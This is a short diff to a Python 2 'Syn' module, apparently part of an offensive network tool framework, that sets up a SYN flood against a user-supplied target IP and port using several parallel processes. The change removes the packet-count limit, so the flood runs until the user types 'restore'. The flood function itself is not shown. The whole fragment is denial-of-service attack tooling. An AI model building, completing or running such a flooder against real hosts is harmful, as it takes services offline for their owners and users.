@@ -9,7 +9,6 @@ class Syn(Capability):
         self.options = {
                 "port"   : Option("port", 80, "port to flood", True),
                 "target" : Option("target", "", "IP of target to attack", True),
-                "num"    : Option("num", 2000, "Number of packets to send", True),
                 "inter"  : Option("inter", 0.3, "Interval between sending packets", True),
                 "threads": Option("threads", 3, "Number of threads", True),
                 }
@@ -30,6 +29,7 @@ class Syn(Capability):
     
     def launch(self):
         self.threads = []
+        print "Type 'restore' when ready to stop the attack.'"
         for i in range(1, int(self.get_value("threads"))+1):
             print "Beginning thread" + str(i)
             self.threads.append(multiprocessing.Process(target=self.flood, args=()))
